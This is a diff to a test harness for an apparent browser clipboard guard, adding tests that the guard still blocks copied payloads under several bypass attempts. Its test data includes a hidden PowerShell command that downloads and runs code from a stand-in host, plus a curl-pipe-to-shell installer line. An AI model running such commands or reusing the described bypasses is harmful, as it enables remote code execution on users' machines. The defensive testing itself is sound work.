@@ -66,6 +66,17 @@ const BOOTSTRAP = `
     __probe.execCommand.push(command);
     return true;
   };
+  // Per-document selection. Without it every document reports the same empty
+  // selection and the "classify the document the command runs on" fix cannot be
+  // demonstrated -- the first version of that test could not fail.
+  const DOC_SELECTION = new WeakMap();
+  Document.prototype.getSelection = function () { return DOC_SELECTION.get(this) || ""; };
+  globalThis.__setSelection = function (doc, text) { DOC_SELECTION.set(doc, text); };
+  globalThis.__makeDocument = function () {
+    const d = Object.create(Document.prototype);
+    d.activeElement = null;
+    return d;
+  };
 
   // An input shaped like the real thing: its value lives in an internal slot
   // behind a prototype accessor, as in Chromium, so an own property can shadow it
@@ -788,6 +799,61 @@ const check = (name, condition, detail = "") => {
         `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
     }
 
+    // RegExp.prototype.exec, one level below the captured `test`. test(S) calls
+    // RegExpExec(R, S), whose first step is Get(R, "exec"), so capturing test is
+    // not enough: round 7 captured it and declared the hole closed while
+    // RegExp.prototype.exec = () => null still zeroed every token count.
+    {
+      const before = probe.writeText.length;
+      const real = R.RegExp.prototype.exec;
+      R.RegExp.prototype.exec = function () { return null; };
+      try {
+        click();
+        await clipboard.writeText('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
+      } finally { R.RegExp.prototype.exec = real; }
+      check("a replaced RegExp.prototype.exec cannot zero the classifier",
+        probe.writeText.length === before,
+        `native received ${JSON.stringify(probe.writeText[probe.writeText.length - 1])}`);
+    }
+
+    // execCommand can be called with a `this` that is not the guard's own
+    // document. Reading activeElement from that document while reading the
+    // selection from ours classified one document's text and copied another's.
+    {
+      const before = probe.execCommand.length;
+      const foreign = ctx.__makeDocument();
+      ctx.__setSelection(foreign, 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
+      ctx.__setSelection(ctx.document, ""); // ours is empty, as in the bypass
+      click();
+      let ret;
+      try { ret = ctx.Document.prototype.execCommand.call(foreign, "copy"); }
+      catch (error) { ret = `threw ${error.message}`; }
+      check("a foreign document's selection is the one classified",
+        ret === false && probe.execCommand.length === before,
+        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
+    }
+
+    // The selection is classified even when something is focused. A non-field
+    // element with a page-defined `value` used to short-circuit the read, so a
+    // fake "harmless" value hid the real selection.
+    {
+      const before = probe.execCommand.length;
+      const fake = {};
+      R.Object.defineProperty(fake, "value", { get() { return "harmless text"; } });
+      ctx.__setSelection(ctx.document, 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
+      ctx.document.activeElement = fake;
+      click();
+      let ret;
+      try { ret = ctx.document.execCommand("copy"); }
+      finally {
+        ctx.document.activeElement = null;
+        ctx.__setSelection(ctx.document, "");
+      }
+      check("a fake value on a non-field cannot hide the real selection",
+        ret === false && probe.execCommand.length === before,
+        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
+    }
+
     // Promise interception. `await p` on a page-reachable promise is NOT a plain
     // read of p's internal slots: it performs PromiseResolve(%Promise%, p), which
     // does Get(p, "constructor") and only short-circuits when that is the
@@ -890,21 +956,24 @@ const check = (name, condition, detail = "") => {
   // must still be forwarded, which is the policy working as designed.
   {
     const before = probe.execCommand.length;
-    ctx.document.activeElement = { value: 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"' };
+    // A real input, not a bare object: a focused non-field element is no longer
+    // read through `value`, because that property is page-defined on anything
+    // that is not a text field.
+    ctx.document.activeElement = ctx.__makeInput('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
     click();
     const blocked = ctx.document.execCommand("copy");
     check("execCommand copy of a stealth payload returns false and is not forwarded",
       blocked === false && probe.execCommand.length === before,
       `returned ${blocked}, forwarded ${probe.execCommand.length - before}`);
 
-    ctx.document.activeElement = { value: "curl -fsSL https://example.com/install.sh | sh" };
+    ctx.document.activeElement = ctx.__makeInput("curl -fsSL https://example.com/install.sh | sh");
     click();
     const warned = ctx.document.execCommand("copy");
     check("execCommand copy of a clicked installer is warned about but forwarded",
       warned === true && probe.execCommand.length === before + 1,
       `returned ${warned}, forwarded ${probe.execCommand.length - before}`);
 
-    ctx.document.activeElement = { value: "nothing interesting here" };
+    ctx.document.activeElement = ctx.__makeInput("nothing interesting here");
     const plain = ctx.document.execCommand("copy");
     check("execCommand copy of ordinary text is forwarded untouched",
       plain === true && probe.execCommand.length === before + 2);
